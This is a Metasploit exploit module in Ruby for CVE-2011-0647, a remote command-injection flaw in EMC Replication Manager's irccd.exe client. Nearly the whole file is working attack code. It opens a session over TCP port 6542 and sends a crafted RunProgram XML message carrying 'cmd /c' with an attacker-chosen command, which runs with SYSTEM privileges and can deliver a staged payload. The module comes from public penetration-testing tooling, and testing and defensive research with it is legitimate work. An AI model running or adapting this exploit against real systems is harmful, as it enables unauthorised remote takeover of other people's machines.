##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
  Rank = GreatRanking

  include Msf::Exploit::Remote::Tcp
  include Msf::Exploit::CmdStagerVBS

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'EMC Replication Manager Command Execution',
      'Description'    => %q{
        This module exploits a remote command-injection vulnerability in EMC Replication Manager
        client (irccd.exe). By sending a specially crafted message invoking RunProgram function an
        attacker may be able to execute arbitrary code commands with SYSTEM privileges. Affected
        products are EMC Replication Manager < 5.3. This module has been successfully tested
        against EMC Replication Manager 5.2.1 on XP/W2003. EMC Networker Module for Microsoft
        Applications 2.1 and 2.2 may be vulnerable too although this module have not been tested
        against these products.
      },
      'Author'         =>
        [
          'Unknown', #Initial discovery
          'Davy Douhine' #MSF module
        ],
      'License'        => MSF_LICENSE,
      'References'     =>
        [
          [ 'CVE', '2011-0647' ],
          [ 'OSVDB', '70853' ],
          [ 'BID', '46235' ],
          [ 'URL', 'http://www.securityfocus.com/archive/1/516260' ],
          [ 'URL', 'http://www.zerodayinitiative.com/advisories/ZDI-11-061/' ]
        ],
      'DisclosureDate' => 'Feb 07 2011',
      'Platform'       => 'win',
      'Arch'           => ARCH_X86,
      'Payload'        =>
        {
          'Space'       => 4096,
          'DisableNops' => true
        },
      'Targets'        =>
        [
          # Tested on Windows XP and Windows 2003
          [ 'EMC Replication Manager 5.2.1 / Windows Native Payload', { } ]
        ],
      'DefaultOptions' =>
        {
          'WfsDelay' => 5
        },
      'DefaultTarget'  => 0,
      'Privileged'     => true
      ))

    register_options(
      [
        Opt::RPORT(6542)
      ], self.class)
  end

  def exploit
    execute_cmdstager({:linemax => 5000})
  end

  def execute_command(cmd, opts)
    connect
    hello = "1HELLOEMC00000000000000000000000"
    vprint_status("Sending hello...")
    sock.put(hello)
    result = sock.get_once || ''
    if result =~ /RAWHELLO/
      vprint_good("Expected hello response")
    else
      disconnect
      fail_with(Failure::Unknown ,"Failed to hello the server")
    end

    start_session = "EMC_Len0000000136<?xml version=\"1.0\" encoding=\"UTF-8\"?><ir_message ir_sessionId=0000 ir_type=\"ClientStartSession\" <ir_version>1</ir_version></ir_message>"
    vprint_status("Starting session...")
    sock.put(start_session)
    result = sock.get_once || ''
    if result =~ /EMC/
      vprint_good("A session has been created. Good.")
    else
      disconnect
      fail_with(Failure::Unknown, "Failed to create the session")
    end

    run_prog = "<?xml version=\"1.0\" encoding=\"UTF-8\"?> "
    run_prog << "<ir_message ir_sessionId=\"01111\" ir_requestId=\"00000\" ir_type=\"RunProgram\" ir_status=\"0\"><ir_runProgramCommand>cmd /c #{cmd}</ir_runProgramCommand>"
    run_prog << "<ir_runProgramAppInfo><?xml version="1.0" encoding="UTF-8"?> <ir_message ir_sessionId="00000" ir_requestId="00000" "
    run_prog << "ir_type="App Info" ir_status="0"><IR_groupEntry IR_groupType="anywriter"  IR_groupName="CM1109A1"  IR_groupId="1" "
    run_prog << "><?xml version="1.0" encoding="UTF-8"?  > <ir_message ir_sessionId="00000" "
    run_prog << "ir_requestId="00000"ir_type="App Info" ir_status="0"><aa_anywriter_ccr_node>CM1109A1"
    run_prog << "</aa_anywriter_ccr_node><aa_anywriter_fail_1018>0</aa_anywriter_fail_1018><aa_anywriter_fail_1019>0"
    run_prog << "</aa_anywriter_fail_1019><aa_anywriter_fail_1022>0</aa_anywriter_fail_1022><aa_anywriter_runeseutil>1"
    run_prog << "</aa_anywriter_runeseutil><aa_anywriter_ccr_role>2</aa_anywriter_ccr_role><aa_anywriter_prescript>"
    run_prog << "</aa_anywriter_prescript><aa_anywriter_postscript></aa_anywriter_postscript><aa_anywriter_backuptype>1"
    run_prog << "</aa_anywriter_backuptype><aa_anywriter_fail_447>0</aa_anywriter_fail_447><aa_anywriter_fail_448>0"
    run_prog << "</aa_anywriter_fail_448><aa_exchange_ignore_all>0</aa_exchange_ignore_all><aa_anywriter_sthread_eseutil>0&amp"
    run_prog << ";lt;/aa_anywriter_sthread_eseutil><aa_anywriter_required_logs>0</aa_anywriter_required_logs><aa_anywriter_required_logs_path"
    run_prog << "></aa_anywriter_required_logs_path><aa_anywriter_throttle>1</aa_anywriter_throttle><aa_anywriter_throttle_ios>300"
    run_prog << "</aa_anywriter_throttle_ios><aa_anywriter_throttle_dur>1000</aa_anywriter_throttle_dur><aa_backup_username>"
    run_prog << "</aa_backup_username><aa_backup_password></aa_backup_password><aa_exchange_checksince>1335208339"
    run_prog << "</aa_exchange_checksince> </ir_message></IR_groupEntry> </ir_message></ir_runProgramAppInfo>"
    run_prog << "<ir_applicationType>anywriter</ir_applicationType><ir_runProgramType>backup</ir_runProgramType> </ir_message>"
    run_prog_header = "EMC_Len000000"
    run_prog_packet = run_prog_header + run_prog.length.to_s + run_prog

    vprint_status("Executing command....")
    sock.put(run_prog_packet)
    sock.get_once(-1, 1)

    end_string = Rex::Text.rand_text_alpha(rand(10)+32)
    sock.put(end_string)
    sock.get_once(-1, 1)
    disconnect

  end
end
